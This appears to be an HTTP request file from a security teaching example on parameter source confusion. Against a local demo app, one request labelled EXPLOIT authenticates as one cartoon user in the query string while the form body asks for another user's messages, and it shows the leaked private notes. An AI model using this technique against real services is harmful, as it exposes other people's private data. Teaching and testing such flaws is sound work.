@base = http://localhost:8000/ii/source-precedence/example2

### SpongeBob can authenticate and retrieve his own messages using consistent parameters
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=spongebob

# Results in 200 OK:
#
# [
#   {
#     "from": "patrick",
#     "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#   }
# ]

###

### EXPLOIT: Plankton authenticates as SpongeBob but retrieves Squidward's messages
### by providing different usernames in query string (for auth) vs form body (for retrieval)
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward

# Results in data disclosure:
#
# [
#   {
#     "from": "mr.krabs",
#     "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#   },
#   {
#     "from": "squidward",
#     "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#   }
# ]
#
# IMPACT: Plankton has stolen Squidward's private notes, learning where Mr. Krabs
# hides the safe key! This basic parameter source confusion allows reading any user's
# messages by authenticating as one user while requesting another's data.
